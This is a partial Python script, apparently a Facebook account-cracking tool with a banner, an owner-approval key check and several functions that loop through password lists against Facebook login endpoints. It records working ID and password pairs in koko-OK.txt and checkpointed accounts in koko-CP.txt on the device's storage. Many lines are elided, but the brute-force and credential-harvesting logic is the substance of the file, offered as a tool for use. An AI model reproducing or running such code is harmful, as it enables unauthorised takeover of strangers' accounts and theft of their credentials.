...
██      ██ ██   ██       ██   ██ ██   ██ ██████   ██████   ██████  
  ...
  \33[;97m
=======================================================
\033[;37m\033[;97m         Facebook       \033[;37m\033[;92m  : SanaULLAH-afD
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print("\33[1;97m----------------------------------------------")
      print("\33[1;97mFirst Join SSG Group ")
      print('Copy Key and send SSG Owner')
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Sk:
                                ...
                                print('\r\r\033[1;32m koko-OK %s | %s'%(ids,pas))
                                open('/sdcard/koko-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Sk:
                                if 'y' in pcp:
                                        print('\r\033[1;97m koko-CP '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/koko-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m koko-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/koko-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32mkoko-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/koko-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/koko-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m koko-OK '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/koko-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32mkoko-OK '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/koko-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
